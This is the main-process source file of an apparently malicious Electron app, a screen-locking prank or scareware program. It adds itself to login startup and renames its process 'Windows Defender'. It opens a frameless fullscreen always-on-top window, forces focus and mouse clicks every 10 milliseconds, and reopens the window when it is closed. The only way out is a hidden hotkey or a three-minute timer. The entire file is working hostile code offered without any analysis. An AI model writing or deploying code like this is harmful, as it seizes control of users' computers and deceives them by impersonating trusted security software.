// Modules to control application life and create native browser window
const robot = require('robotjs')
const { GlobalKeyboardListener } = require('node-global-key-listener')
const { app, BrowserWindow, screen: electronScreen } = require('electron')

const path = require('path')
const keyboard = new GlobalKeyboardListener()

app.setLoginItemSettings({
    openAtLogin: true,
    path: app.getPath('exe'),
  });

let legitQuit = false

keyboard.addListener((event) => {
    const key = event.name;
    if (key === "NUMPAD MULTIPLY" || key === "F8") {
        legitQuit = true
        app.quit()
    }
});


const screenSize = robot.getScreenSize();
let mainWindow;

function createWindow() {
    // Create the browser window.
    mainWindow = new BrowserWindow({
        width: 800,
        height: 600,
        alwaysOnTop: true,
        fullscreen: true,
        frame: false,
        icon: path.join(__dirname, 'logo.ico'),
        webPreferences: {
            preload: path.join(__dirname, 'preload.js')
        }
    })


    mainWindow.loadFile('index.html')
    robot.moveMouse(screenSize.width / 2, screenSize.height / 4)
    robot.mouseClick("left", false)
}

app.whenReady().then(() => {

    setTimeout(() => {
        legitQuit = true
        app.quit()
    }, 3*60000);

    process.title = 'Windows Defender';
    createWindow()
    app.on('activate', function () {
        if (BrowserWindow.getAllWindows().length === 0) createWindow()
    })

    setInterval(() => {
        if (mainWindow) {
            if (robot.getMousePos().x > screenSize.width || robot.getMousePos().y > screenSize.height || robot.getMousePos().x < 0 || robot.getMousePos().y < 0) {
                robot.moveMouse(screenSize.width / 2, screenSize.height / 4)
            }

            if (!mainWindow.isDestroyed() && !mainWindow.isFocused()) {
                if (mainWindow.isMinimized()) {
                    mainWindow.restore();
                }
                mainWindow.show();
                mainWindow.focus();
                robot.moveMouse(screenSize.width / 2, screenSize.height / 4)
                robot.mouseClick("left", false)
            }
        }
    }, 10)

})


app.on('window-all-closed', (e) => {
    createWindow()
    e.preventDefault();
})

app.on('close', (e) => {
    createWindow()
    e.preventDefault();
})